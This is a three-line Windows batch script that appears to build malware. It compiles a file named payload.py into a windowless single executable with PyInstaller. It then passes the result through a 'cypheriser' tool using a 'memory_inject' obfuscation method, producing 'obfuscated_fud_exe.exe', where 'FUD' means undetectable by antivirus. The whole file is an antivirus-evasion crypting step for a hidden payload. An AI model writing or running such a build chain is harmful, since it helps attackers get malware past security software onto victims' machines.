@echo off
pyinstaller payload.py --onefile --noconsole
cypheriser_d.exe --algo x4096_rotative_pgp --obfuscation_method memory_inject --input_file ./dist/payload.exe --output_file obfuscated_fud_exe.exe